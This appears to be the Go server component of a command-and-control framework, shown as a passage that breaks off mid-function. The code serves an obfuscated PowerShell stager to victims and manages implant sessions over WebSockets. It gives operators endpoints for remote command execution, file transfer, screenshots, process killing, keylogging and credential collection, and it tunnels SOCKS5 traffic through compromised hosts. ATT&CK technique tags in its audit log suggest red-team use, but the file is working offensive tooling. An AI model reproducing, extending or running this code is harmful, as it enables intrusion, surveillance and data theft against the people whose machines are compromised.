package main

import (
	"bufio"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"

	"c2/common"

	"github.com/gorilla/websocket"
)

var auditLog *log.Logger

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

var clients = make(map[string]*common.Client)
var clientsMutex sync.Mutex

type responseEvent struct {
	SessionID string
	Response  common.Response
}

var responseChan = make(chan responseEvent, 64)

var pendingResponses = make(map[string]chan responseEvent)
var pendingMutex sync.Mutex

const defaultSessionLogFile = "c2_sessions.jsonl"
var sessionLogFile = defaultSessionLogFile
var sessionLogMutex sync.Mutex

type socksConnEntry struct {
	socksConn net.Conn
	sessionID string
	client    *common.Client
}
var socksConns = make(map[string]*socksConnEntry)
var socksConnsMu sync.Mutex

var sessionPlatform = make(map[string]string)
var sessionPlatformMu sync.Mutex

func main() {
	config := LoadConfig()
	if err := config.Save(); err != nil {
		log.Printf("Error saving config: %v", err)
	}

	tlsConfig, err := config.GetTLSConfig()
	if err != nil {
		log.Fatalf("Error loading TLS config: %v", err)
	}

	http.HandleFunc("/live", handleWebSocket)
	http.HandleFunc("/sync", handleSync)
	http.HandleFunc("/view/", handleView)
	http.HandleFunc("/view", handleView)
	http.HandleFunc("/op/sessions", corsOp(handleOpSessions))
	http.HandleFunc("/op/exec", corsOp(handleOpExec))
	http.HandleFunc("/op/health", corsOp(handleOpHealth))
	http.HandleFunc("/op/kill", corsOp(handleOpKill))
	http.HandleFunc("/op/upload", corsOp(handleOpUpload))
	http.HandleFunc("/op/download", corsOp(handleOpDownload))
	http.HandleFunc("/op/listdir", corsOp(handleOpListDir))
	http.HandleFunc("/op/screenshot", corsOp(handleOpScreenshot))
	http.HandleFunc("/op/processlist", corsOp(handleOpProcessList))
	http.HandleFunc("/op/prockill", corsOp(handleOpProcessKill))
	http.HandleFunc("/op/keylog/start", corsOp(handleOpKeylogStart))
	http.HandleFunc("/op/keylog/stop", corsOp(handleOpKeylogStop))
	http.HandleFunc("/op/creds", corsOp(handleOpCreds))
	http.HandleFunc("/op/sessions/history", corsOp(handleOpSessionsHistory))
	http.HandleFunc("/op/audit", corsOp(handleOpAudit))

	if f, err := os.OpenFile("c2_audit.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644); err == nil {
		auditLog = log.New(f, "", log.LstdFlags)
	} else {
		auditLog = log.New(os.Stdout, "[AUDIT] ", log.LstdFlags)
	}

	go runResponsePrinter()
	if isTTY(os.Stdin) {
		go runOperator()
	} else {
		log.Printf("No TTY for stdin; operator REPL disabled. Use HTTP API: GET /op/sessions, POST /op/exec, POST /op/kill")
	}

	if config.SocksPort > 0 {
		go runSocksServer(config.SocksPort)
	}

	if len(config.Listeners) > 0 {
		var wg sync.WaitGroup
		for i := range config.Listeners {
			lis := &config.Listeners[i]
			wg.Add(1)
			go func() {
				defer wg.Done()
				addr := fmt.Sprintf(":%d", lis.Port)
				srv := &http.Server{Addr: addr}
				if lis.TLS {
					tc, err := tls.LoadX509KeyPair(lis.CertFile, lis.KeyFile)
					if err != nil {
						log.Printf("Listener %s TLS error: %v", addr, err)
						return
					}
					srv.TLSConfig = &tls.Config{Certificates: []tls.Certificate{tc}, MinVersion: tls.VersionTLS12}
					log.Printf("Listening TLS on %s", addr)
					log.Fatal(srv.ListenAndServeTLS("", ""))
				} else {
					log.Printf("Listening (no TLS) on %s", addr)
					log.Fatal(srv.ListenAndServe())
				}
			}()
		}
		wg.Wait()
		return
	}

	server := &http.Server{
		Addr:      fmt.Sprintf(":%d", config.Port),
		TLSConfig: tlsConfig,
	}
	log.Printf("Server starting on port %d", config.Port)
	log.Printf("GET /sync  GET /view  WS /live  GET /op/sessions, /op/health  POST /op/exec, /op/kill")
	log.Printf("Operator: list | use <id> | exec <cmd> | exit")
	log.Fatal(server.ListenAndServeTLS("", ""))
}

func isTTY(f *os.File) bool {
	fi, err := f.Stat()
	if err != nil {
		return false
	}
	return (fi.Mode() & os.ModeCharDevice) != 0
}

func shortSessionID() string {
	b := make([]byte, 4)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func runResponsePrinter() {
	for ev := range responseChan {
		out := ev.Response.Output
		if ev.Response.Error != "" {
			out = ev.Response.Error
		}
		fmt.Printf("\n[%s] %s: %s\n> ", ev.SessionID, ev.Response.CommandID, strings.TrimSpace(out))
	}
}

func runOperator() {
	time.Sleep(500 * time.Millisecond)
	var selected string
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("> ")
		if !scanner.Scan() {
			break
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, " ", 2)
		cmd := parts[0]
		rest := ""
		if len(parts) > 1 {
			rest = strings.TrimSpace(parts[1])
		}
		switch cmd {
		case "exit", "quit":
			return
		case "list", "ls":
			clientsMutex.Lock()
			for id, c := range clients {
				fmt.Printf("  %s  %s\n", id, c.Conn.RemoteAddr())
			}
			if len(clients) == 0 {
				fmt.Println("  (none)")
			}
			clientsMutex.Unlock()
		case "use":
			if rest == "" {
				fmt.Println("use <session-id>")
				continue
			}
			clientsMutex.Lock()
			if _, ok := clients[rest]; ok {
				selected = rest
				fmt.Printf("selected %s\n", selected)
			} else {
				fmt.Println("unknown session")
			}
			clientsMutex.Unlock()
		case "exec", "run":
			if selected == "" {
				fmt.Println("select a session first: use <id>")
				continue
			}
			if rest == "" {
				fmt.Println("exec <command>")
				continue
			}
			clientsMutex.Lock()
			c, ok := clients[selected]
			clientsMutex.Unlock()
			if !ok {
				fmt.Println("session gone")
				selected = ""
				continue
			}
			cmdID := shortSessionID()
			if auditLog != nil {
				auditLog.Printf("exec stdin session=%s command=%s", selected, rest)
			}
			cm := common.Command{
				Type: common.CmdExec,
				ID:   cmdID,
				Args: map[string]string{"command": rest},
			}
			c.Mu.Lock()
			err := c.Conn.WriteJSON(cm)
			c.Mu.Unlock()
			if err != nil {
				fmt.Printf("send error: %v\n", err)
			} else {
				fmt.Printf("sent %s\n", cmdID)
			}
		default:
			fmt.Println("list | use <id> | exec <cmd> | exit")
		}
	}
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("Error upgrading connection: %v", err)
		return
	}
	defer conn.Close()

	_, message, err := conn.ReadMessage()
	if err != nil {
		log.Printf("Error reading initial message: %v", err)
		return
	}

	var auth struct {
		ClientID     string `json:"client_id"`
		ClientSecret string `json:"client_secret"`
		Platform     string `json:"platform"`
	}
	if err := json.Unmarshal(message, &auth); err != nil {
		log.Printf("Error parsing auth message: %v", err)
		return
	}

	config := LoadConfig()
	if auth.ClientID != config.ClientID || auth.ClientSecret != config.ClientSecret {
		log.Printf("Invalid client credentials")
		return
	}

	sessionID := shortSessionID()
	client := &common.Client{
		ID:           sessionID,
		Conn:         conn,
		LastCheckin:  time.Now(),
		CommandQueue: make(map[string]common.Command),
	}

	clientsMutex.Lock()
	clients[sessionID] = client
	clientsMutex.Unlock()

	sessionPlatformMu.Lock()
	sessionPlatform[sessionID] = auth.Platform
	sessionPlatformMu.Unlock()

	addrStr := conn.RemoteAddr().String()
	appendSessionEventWithPlatform("joined", sessionID, addrStr, auth.Platform)

	defer func() {
		appendSessionEvent("left", sessionID, "")
		clientsMutex.Lock()
		delete(clients, sessionID)
		clientsMutex.Unlock()
		sessionPlatformMu.Lock()
		delete(sessionPlatform, sessionID)
		sessionPlatformMu.Unlock()
	}()

	log.Printf("session %s connected", sessionID)

	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			log.Printf("Session %s closed: %v", sessionID, err)
			return
		}
		var raw map[string]interface{}
		if err := json.Unmarshal(message, &raw); err != nil {
			continue
		}
		if _, ok := raw["socks_data"]; ok {
			if cid, _ := raw["conn_id"].(string); cid != "" {
				if data, _ := raw["data"].(string); data != "" {
					dec, _ := base64.StdEncoding.DecodeString(data)
					socksConnsMu.Lock()
					ent := socksConns[cid]
					socksConnsMu.Unlock()
					if ent != nil && ent.socksConn != nil {
						ent.socksConn.Write(dec)
					}
				}
			}
			continue
		}
		var resp common.Response
		if err := json.Unmarshal(message, &resp); err != nil {
			continue
		}
		ev := responseEvent{SessionID: sessionID, Response: resp}
		select {
		case responseChan <- ev:
		default:
		}
		pendingMutex.Lock()
		if ch, ok := pendingResponses[resp.CommandID]; ok {
			delete(pendingResponses, resp.CommandID)
			pendingMutex.Unlock()
			select {
			case ch <- ev:
			default:
			}
		} else {
			pendingMutex.Unlock()
		}
	}
}

func runSocksServer(port int) {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		log.Printf("SOCKS listen error: %v", err)
		return
	}
	log.Printf("SOCKS5 proxy listening on port %d", port)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleSocksConn(conn)
	}
}

func handleSocksConn(socksConn net.Conn) {
	defer socksConn.Close()
	buf := make([]byte, 256)
	n, err := io.ReadAtLeast(socksConn, buf, 3)
	if err != nil || n < 3 || buf[0] != 0x05 || buf[1] != 0x01 {
		return
	}
	if _, err := socksConn.Write([]byte{0x05, 0x00}); err != nil {
		return
	}
	n, err = io.ReadAtLeast(socksConn, buf, 4)
	if err != nil || n < 4 || buf[0] != 0x05 || buf[1] != 0x01 {
		return
	}
	var target string
	switch buf[3] {
	case 0x01:
		if _, err := io.ReadFull(socksConn, buf[4:10]); err != nil {
			return
		}
		target = fmt.Sprintf("%d.%d.%d.%d:%d", buf[4], buf[5], buf[6], buf[7], int(buf[8])<<8|int(buf[9]))
	case 0x03:
		if _, err := io.ReadFull(socksConn, buf[4:5]); err != nil {
			return
		}
		alen := int(buf[4])
		if _, err := io.ReadFull(socksConn, buf[5:5+alen+2]); err != nil {
			return
		}
		target = string(buf[5:5+alen]) + fmt.Sprintf(":%d", int(buf[5+alen])<<8|int(buf[5+alen+1]))
	default:
		return
	}
	connID := shortSessionID()
	clientsMutex.Lock()
	var sessionID string
	for id := range clients {
		sessionID = id
		break
	}
	clientsMutex.Unlock()
	if sessionID == "" {
		socksConn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	ev, ok := opSendAndWait(sessionID, common.Command{
		Type: common.CmdSocksConnect,
		Args: map[string]string{"conn_id": connID, "target_addr": target},
	})
	if !ok || ev.Response.Status != "success" {
		socksConn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	socksConn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
	clientsMutex.Lock()
	c, ok := clients[sessionID]
	clientsMutex.Unlock()
	if !ok {
		return
	}
	entry := &socksConnEntry{socksConn: socksConn, sessionID: sessionID, client: c}
	socksConnsMu.Lock()
	socksConns[connID] = entry
	socksConnsMu.Unlock()
	defer func() {
		socksConnsMu.Lock()
		delete(socksConns, connID)
		socksConnsMu.Unlock()
	}()
	for {
		buf := make([]byte, 32*1024)
		n, err := socksConn.Read(buf)
		if err != nil {
			return
		}
		if n == 0 {
			continue
		}
		data := base64.StdEncoding.EncodeToString(buf[:n])
		cmd := common.Command{Type: common.CmdSocksData, ID: shortSessionID(), Args: map[string]string{"conn_id": connID, "data": data}}
		c.Mu.Lock()
		_ = c.Conn.WriteJSON(cmd)
		c.Mu.Unlock()
	}
}

// handleSync serves the run script, base64-encoded (neutral content type).
// If config.SyncToken is set, requires ?k=SyncToken.
func handleSync(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	config := LoadConfig()
	if config.SyncToken != "" && r.URL.Query().Get("k") != config.SyncToken {
		http.NotFound(w, r)
		return
	}
	tpl, err := os.ReadFile("run.ps1.template")
	if err != nil {
		log.Printf("sync template read error: %v", err)
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	host := r.Host
	if host == "" {
		host = fmt.Sprintf("localhost:%d", config.Port)
	}
	scheme := "https"
	if r.TLS == nil {
		scheme = "http"
	}
	serverURL := fmt.Sprintf("%s://%s", scheme, host)
	q := r.URL.Query()
	interval := q.Get("interval")
	if interval == "" {
		interval = "30"
	}
	jitter := q.Get("jitter")
	if jitter == "" {
		jitter = "0"
	}
	killDate := q.Get("kill_date")
	workingStart := q.Get("working_hours_start")
	workingEnd := q.Get("working_hours_end")
	script := string(tpl)
	script = strings.ReplaceAll(script, "SERVER_URL", serverURL)
	script = strings.ReplaceAll(script, "CLIENT_ID", config.ClientID)
	script = strings.ReplaceAll(script, "CLIENT_SECRET", config.ClientSecret)
	script = strings.ReplaceAll(script, "CALLBACK_INTERVAL", interval)
	script = strings.ReplaceAll(script, "JITTER_PERCENT", jitter)
	script = strings.ReplaceAll(script, "KILL_DATE", killDate)
	script = strings.ReplaceAll(script, "WORKING_HOURS_START", workingStart)
	script = strings.ReplaceAll(script, "WORKING_HOURS_END", workingEnd)
	encoded := base64.StdEncoding.EncodeToString([]byte(script))
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.Write([]byte(encoded))
}

func corsOp(h http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Op-Token, X-Op-Identity")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		h(w, r)
	}
}

func checkOpToken(r *http.Request) bool {
	config := LoadConfig()
	if config.OpToken == "" {
		return true
	}
	return r.Header.Get("X-Op-Token") == config.OpToken || r.URL.Query().Get("k") == config.OpToken
}

func getOperatorID(r *http.Request) string {
	if id := r.Header.Get("X-Op-Identity"); id != "" {
		return id
	}
	if id := LoadConfig().OpIdentity; id != "" {
		return id
	}
	return "unknown"
}

const auditJSONLFile = "c2_audit.jsonl"
var auditJSONLMutex sync.Mutex

var actionToTechnique = map[string]string{
	"exec":         "T1059.003",
	"kill":         "",
	"upload":       "T1537",
	"download":     "T1530",
	"screenshot":   "T1113",
	"processlist":  "T1057",
	"prockill":     "T1562",
	"keylog_start": "T1056.001",
	"keylog_stop":  "T1056.001",
}

func appendAuditJSONL(r *http.Request, action, sessionID, detail string) {
	auditJSONLMutex.Lock()
	defer auditJSONLMutex.Unlock()
	f, err := os.OpenFile(auditJSONLFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Printf("audit jsonl write error: %v", err)
		return
	}
	defer f.Close()
	techniqueID := actionToTechnique[action]
	line, _ := json.Marshal(map[string]string{
		"ts":           time.Now().UTC().Format(time.RFC3339),
		"operator_id":  getOperatorID(r),
		"action":       action,
		"session_id":   sessionID,
		"detail":       detail,
		"technique_id": techniqueID,
	})
	line = append(line, '\n')
	f.Write(line)
}

func appendSessionEvent(event, id, addr string) {
	appendSessionEventWithPlatform(event, id, addr, "")
}

func appendSessionEventWithPlatform(event, id, addr, platform string) {
	sessionLogMutex.Lock()
	defer sessionLogMutex.Unlock()
	f, err := os.OpenFile(sessionLogFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Printf("session log write error: %v", err)
		return
	}
	defer f.Close()
	at := time.Now().UTC().Format(time.RFC3339)
	var line []byte
	if event == "joined" {
		m := map[string]string{"event": "joined", "id": id, "addr": addr, "at": at}
		if platform != "" {
			m["platform"] = platform
		}
		line, _ = json.Marshal(m)
	} else {
		line, _ = json.Marshal(map[string]string{"event": "left", "id": id, "at": at})
	}
	line = append(line, '\n')
	if _, err := f.Write(line); err != nil {
		log.Printf("session log write error: %v", err)
	}
}

func handleOpSessions(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	type sessionInfo struct {
		ID       string `json:"id"`
		Addr     string `json:"addr"`
		Platform string `json:"platform,omitempty"`
	}
	var list []sessionInfo
	clientsMutex.Lock()
	sessionPlatformMu.Lock()
	for id, c := range clients {
		plat := sessionPlatform[id]
		list = append(list, sessionInfo{ID: id, Addr: c.Conn.RemoteAddr().String(), Platform: plat})
	}
	sessionPlatformMu.Unlock()
	clientsMutex.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(list)
}

const sessionHistoryLimit = 100

func handleOpAudit(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	limit := 100
	if s := r.URL.Query().Get("limit"); s != "" {
		if n, err := fmt.Sscanf(s, "%d", &limit); err == nil && n == 1 && limit > 0 {
			if limit > 500 {
				limit = 500
			}
		}
	}
	format := r.URL.Query().Get("format")
	f, err := os.Open(auditJSONLFile)
	if err != nil {
		if os.IsNotExist(err) {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode([]interface{}{})
			return
		}
		http.Error(w, "failed to read audit", http.StatusInternalServerError)
		return
	}
	defer f.Close()
	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		http.Error(w, "failed to read audit", http.StatusInternalServerError)
		return
	}
	// newest first: take last limit, reverse
	start := 0
	if len(lines) > limit {
		start = len(lines) - limit
	}
	var out []map[string]string
	for i := len(lines) - 1; i >= start; i-- {
		var m map[string]string
		if json.Unmarshal([]byte(lines[i]), &m) == nil {
			out = append(out, m)
		}
	}
	if format == "csv" {
		w.Header().Set("Content-Type", "text/csv")
		w.Header().Set("Content-Disposition", "attachment; filename=audit.csv")
		w.Write([]byte("ts,operator_id,action,session_id,technique_id,detail\n"))
		for _, m := range out {
			ts := m["ts"]
			op := m["operator_id"]
			action := m["action"]
			sid := m["session_id"]
			tid := m["technique_id"]
			detail := m["detail"]
			if strings.Contains(detail, ",") || strings.Contains(detail, "\"") {
				detail = "\"" + strings.ReplaceAll(detail, "\"", "\"\"") + "\""
			}
			w.Write([]byte(fmt.Sprintf("%s,%s,%s,%s,%s,%s\n", ts, op, action, sid, tid, detail)))
		}
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(out)
}

func handleOpSessionsHistory(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	f, err := os.Open(sessionLogFile)
	if err != nil {
		if os.IsNotExist(err) {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode([]interface{}{})
			return
		}
		http.Error(w, "failed to read session history", http.StatusInternalServerError)
		return
	}
	defer f.Close()

	type logEvent struct {
		Event    string `json:"event"`
		ID       string `json:"id"`
		Addr     string `json:"addr"`
		At       string `json:"at"`
		Platform string `json:"platform"`
	}
	type sessionRecord struct {
		ID        string `json:"id"`
		Addr      string `json:"addr"`
		Platform  string `json:"platform,omitempty"`
		FirstSeen string `json:"first_seen"`
		LastSeen  string `json:"last_seen"`
	}
	byID := make(map[string]*sessionRecord)
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		var e logEvent
		if json.Unmarshal(scanner.Bytes(), &e) != nil || e.ID == "" {
			continue
		}
		rec, ok := byID[e.ID]
		if !ok {
			rec = &sessionRecord{ID: e.ID}
			byID[e.ID] = rec
		}
		if e.Event == "joined" {
			rec.Addr = e.Addr
			if e.Platform != "" {
				rec.Platform = e.Platform
			}
			if rec.FirstSeen == "" {
				rec.FirstSeen = e.At
			}
			rec.LastSeen = e.At
		} else if e.Event == "left" {
			rec.LastSeen = e.At
		}
	}
	if err := scanner.Err(); err != nil {
		http.Error(w, "failed to read session history", http.StatusInternalServerError)
		return
	}

	var list []*sessionRecord
	for _, rec := range byID {
		list = append(list, rec)
	}
	sort.Slice(list, func(i, j int) bool {
		return list[i].LastSeen > list[j].LastSeen
	})
	if len(list) > sessionHistoryLimit {
		list = list[:sessionHistoryLimit]
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(list)
}

func handleOpExec(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	var req struct {
		SessionID string `json:"session_id"`
		Command   string `json:"command"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" || req.Command == "" {
		http.Error(w, "bad request: need session_id and command", http.StatusBadRequest)
		return
	}
	if auditLog != nil {
		auditLog.Printf("exec api session=%s command=%s", req.SessionID, req.Command)
	}
	clientsMutex.Lock()
	c, ok := clients[req.SessionID]
	clientsMutex.Unlock()
	if !ok {
		http.Error(w, "session not found", http.StatusNotFound)
		return
	}
	cmdID := shortSessionID()
	ch := make(chan responseEvent, 1)
	pendingMutex.Lock()
	pendingResponses[cmdID] = ch
	pendingMutex.Unlock()
	cm := common.Command{
		Type: common.CmdExec,
		ID:   cmdID,
		Args: map[string]string{"command": req.Command},
	}
	c.Mu.Lock()
	err := c.Conn.WriteJSON(cm)
	c.Mu.Unlock()
	if err != nil {
		pendingMutex.Lock()
		delete(pendingResponses, cmdID)
		pendingMutex.Unlock()
		http.Error(w, "send failed", http.StatusInternalServerError)
		return
	}
	select {
	case ev := <-ch:
		appendAuditJSONL(r, "exec", ev.SessionID, req.Command)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{
			"session_id": ev.SessionID,
			"command_id": ev.Response.CommandID,
			"status":     ev.Response.Status,
			"output":     ev.Response.Output,
			"error":      ev.Response.Error,
		})
	case <-time.After(90 * time.Second):
		pendingMutex.Lock()
		delete(pendingResponses, cmdID)
		pendingMutex.Unlock()
		http.Error(w, "timeout waiting for response", http.StatusGatewayTimeout)
	}
}

func handleOpHealth(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	clientsMutex.Lock()
	n := len(clients)
	clientsMutex.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "sessions": n})
}

func handleOpKill(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	var req struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
		return
	}
	clientsMutex.Lock()
	c, ok := clients[req.SessionID]
	if ok {
		delete(clients, req.SessionID)
	}
	clientsMutex.Unlock()
	if !ok {
		http.Error(w, "session not found", http.StatusNotFound)
		return
	}
	c.Mu.Lock()
	c.Conn.Close()
	c.Mu.Unlock()
	if auditLog != nil {
		auditLog.Printf("kill session=%s", req.SessionID)
	}
	appendAuditJSONL(r, "kill", req.SessionID, "")
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok", "session_id": req.SessionID})
}

func opSendAndWait(sessionID string, cm common.Command) (ev responseEvent, ok bool) {
	clientsMutex.Lock()
	c, ok := clients[sessionID]
	clientsMutex.Unlock()
	if !ok {
		return responseEvent{}, false
	}
	cmdID := shortSessionID()
	cm.ID = cmdID
	ch := make(chan responseEvent, 1)
	pendingMutex.Lock()
	pendingResponses[cmdID] = ch
	pendingMutex.Unlock()
	c.Mu.Lock()
	err := c.Conn.WriteJSON(cm)
	c.Mu.Unlock()
	if err != nil {
		pendingMutex.Lock()
		delete(pendingResponses, cmdID)
		pendingMutex.Unlock()
		return responseEvent{}, false
	}
	select {
	case ev := <-ch:
		return ev, true
	case <-time.After(120 * time.Second):
		pendingMutex.Lock()
		delete(pendingResponses, cmdID)
		pendingMutex.Unlock()
		return responseEvent{}, false
	}
}

func handleOpUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	var req struct {
		SessionID string `json:"session_id"`
		Path      string `json:"path"`
		Content   string `json:"content"` // base64
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" || req.Path == "" || req.Content == "" {
		http.Error(w, "bad request: need session_id, path, content (base64)", http.StatusBadRequest)
		return
	}
	ev, ok := opSendAndWait(req.SessionID, common.Command{
		Type: common.CmdUpload,
		Args: map[string]string{"path": req.Path, "content": req.Content},
	})
	if !ok {
		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
		return
	}
	appendAuditJSONL(r, "upload", ev.SessionID, req.Path)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"session_id": ev.SessionID, "status": ev.Response.Status,
		"output": ev.Response.Output, "error": ev.Response.Error,
	})
}

func handleOpDownload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	var req struct {
		SessionID string `json:"session_id"`
		Path      string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" || req.Path == "" {
		http.Error(w, "bad request: need session_id and path", http.StatusBadRequest)
		return
	}
	ev, ok := opSendAndWait(req.SessionID, common.Command{
		Type: common.CmdDownload,
		Args: map[string]string{"path": req.Path},
	})
	if !ok {
		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
		return
	}
	appendAuditJSONL(r, "download", ev.SessionID, req.Path)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"session_id": ev.SessionID, "status": ev.Response.Status,
		"output": ev.Response.Output, "error": ev.Response.Error,
	})
}

func handleOpListDir(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	var req struct {
		SessionID string `json:"session_id"`
		Path      string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
		return
	}
	path := req.Path
	if path == "" {
		path = "."
	}
	ev, ok := opSendAndWait(req.SessionID, common.Command{
		Type: common.CmdListDir,
		Args: map[string]string{"path": path},
	})
	if !ok {
		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"session_id": ev.SessionID, "status": ev.Response.Status,
		"output": ev.Response.Output, "error": ev.Response.Error,
	})
}

func handleOpScreenshot(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	var req struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
		return
	}
	ev, ok := opSendAndWait(req.SessionID, common.Command{Type: common.CmdScreenshot, Args: map[string]string{}})
	if !ok {
		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
		return
	}
	appendAuditJSONL(r, "screenshot", ev.SessionID, "")
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"session_id": ev.SessionID, "status": ev.Response.Status,
		"output": ev.Response.Output, "error": ev.Response.Error,
	})
}

func handleOpProcessList(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	var req struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
		return
	}
	ev, ok := opSendAndWait(req.SessionID, common.Command{Type: common.CmdProcessList, Args: map[string]string{}})
	if !ok {
		http.Error(w, "session not found or timeout", http.StatusInternalServerError)
		return
	}
	appendAuditJSONL(r, "processlist", ev.SessionID, "")
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"session_id": ev.SessionID, "status": ev.Response.Status,
		"output": ev.Response.Output, "error": ev.Response.Error,
	})
}

func handleOpProcessKill(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkOpToken(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	var req struct {
